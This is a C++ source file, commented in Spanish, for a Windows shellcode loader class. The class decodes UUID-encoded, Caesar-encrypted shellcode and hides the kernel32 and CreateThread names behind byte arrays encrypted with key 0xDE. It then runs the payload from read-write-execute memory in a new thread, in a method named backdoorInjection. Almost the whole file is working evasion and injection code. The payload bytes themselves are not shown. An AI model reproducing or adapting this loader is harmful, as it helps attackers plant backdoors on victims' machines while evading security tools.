#include "Injection.h"
#include "Crypt.h"
#include <iomanip>

Injection::Injection() {
	this->shellcode = _uuidListToShellcode(this->uuid_shellcode_vector);
	
	this->_caesarDecrypt(this->shellcode, this->key);

	std::cout << "Shellcode: ";
	for (unsigned char byte : shellcode) {
		std::cout << std::hex << std::setw(2) << std::setfill('0') << static_cast<int>(byte);
	}
	std::cout << std::endl;
}

std::vector<unsigned char> Injection::_hexStringToBytes(const std::string& hex) {
	std::vector<unsigned char> bytes;
	for (size_t i = 0; i < hex.length(); i += 2) {
		unsigned int byte;
		std::stringstream ss;
		ss << std::hex << hex.substr(i, 2);
		ss >> byte;
		bytes.push_back(static_cast<unsigned char>(byte));
	}
	return bytes;
}

std::vector<unsigned char> Injection::_uuidListToShellcode(const std::vector<std::string>& uuidList) {
	std::vector<unsigned char> shellcode;
	for (const auto& uuid : uuidList) {
		// Eliminar los guiones
		std::string hexString;
		for (char c : uuid) {
			if (c != '-') {
				hexString += c;
			}
		}
		// Convertir el UUID (sin guiones) en bytes y agregarlos al shellcode
		std::vector<unsigned char> bytes = _hexStringToBytes(hexString);
		shellcode.insert(shellcode.end(), bytes.begin(), bytes.end());
	}
	return shellcode;
}

VOID Injection::_caesarDecrypt(std::vector<unsigned char>& data, unsigned char key) {
	for (auto& byte : data) {
		byte = (byte - key) % 0x100;  // Descifrado César con clave
	}
}

VOID Injection::_caesarEncrypt(std::vector<unsigned char>& data, unsigned char key) {
	for (auto& byte : data) {
		byte = (byte + key) % 0x100;  // Descifrado César con clave
	}
}

VOID Injection::printShellcode() {
	std::cout << "Shellcode cifrado con llave 0xDE:" << std::endl;
	for (size_t i = 0; i < shellcode.size(); ++i) {
		std::cout << "0x" << std::hex << std::setw(2) << std::setfill('0') << static_cast<int>(shellcode[i]) << ", ";
		if ((i + 1) % 16 == 0) {
			std::cout << "\n";  // Salto de línea cada 16 bytes para mejor visualización
		}
	}
	std::cout << std::endl;
}

VOID Injection::_cleanUpResources(HANDLE hThread, PVOID shellcode_exec) {
	if (hThread) {
		WaitForSingleObject(hThread, INFINITE);
	}
	if (shellcode_exec) {
		VirtualFree(shellcode_exec, 0, MEM_RELEASE);
	}
}

PVOID Injection::_allocateExecutableMemory(SIZE_T size) {
	PVOID memory = VirtualAlloc(0, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (memory == NULL) {
		std::cout << "No se pundo alojar memoria" << std::endl;
	}
	return memory;
}

CreateThreadFunc Injection::_getCreateThreadFunction(void) {
	std::vector<unsigned char> kernel32 = { 0x49, 0x43, 0x50, 0x4c, 0x43, 0x4a, 0x11, 0x10, 0xc, 0x42, 0x4a, 0x4a, };
	std::vector<unsigned char> createRemote = { 0x21, 0x50, 0x43, 0x3f, 0x52, 0x43, 0x32, 0x46, 0x50, 0x43, 0x3f, 0x42 };

	std::string kernel32_str = Crypt::decryptCaesar(kernel32, 0xDE);
	std::string createRemote_str = Crypt::decryptCaesar(createRemote, 0xDE);


	// Conversión de vector a string
	//std::string kernel32_str(kernel32.begin(), kernel32.end());
	//kernel32_str.push_back('\0');

	HMODULE hModule = GetModuleHandleA(	kernel32_str.c_str());
	if (hModule == NULL) {
		std::cout << "No se pudo obtener el dll 32 de nucleo." << std::endl;
	}

	//std::string createRemote_str(createRemote.begin(), createRemote.end());
	//createRemote_str.push_back('\0');

	CreateThreadFunc pCreateThread = (CreateThreadFunc)GetProcAddress(hModule, createRemote_str.c_str());
	if (pCreateThread == NULL) {
		std::cout << "No se pudo obtener la función cración de hilo." << std::endl;
	}

	return pCreateThread;
}

HANDLE Injection::_createShellcodeThread(PVOID shellcode_exec, DWORD& threadID) {
	CreateThreadFunc pCreateThread = this->_getCreateThreadFunction();
	if (pCreateThread == nullptr) {
		return NULL;
	}

	HANDLE hThread = pCreateThread(NULL, 0, (PTHREAD_START_ROUTINE)shellcode_exec, NULL, 0, &threadID);
	if (hThread == NULL) {
		std::cout << "No se pundo crear hilo" << std::endl;
	}

	return hThread;
}

VOID Injection::backdoorInjection(void) {
	SIZE_T shellcodeSize = sizeof(shellcode) - 1;

	// Reserva de memoria para shellcode
	PVOID shellcode_exec = this->_allocateExecutableMemory(shellcode.size());
	if (shellcode_exec == NULL) {
		std::cout << "No se pudo alojar memoria" << std::endl;
		return;
	}
	
	// Se copia el shellcode en la memoria ejecutable
	RtlCopyMemory(shellcode_exec, shellcode.data(), shellcode.size());
	
	// Se crea el hilo de ejecución del shellcode
	DWORD threadID;
	HANDLE hThread = this->_createShellcodeThread(shellcode_exec, threadID);
	if (hThread == NULL) {
		VirtualFree(shellcode_exec, 0, MEM_RELEASE);
		return;
	}
	
	this->_cleanUpResources(hThread, shellcode_exec);
}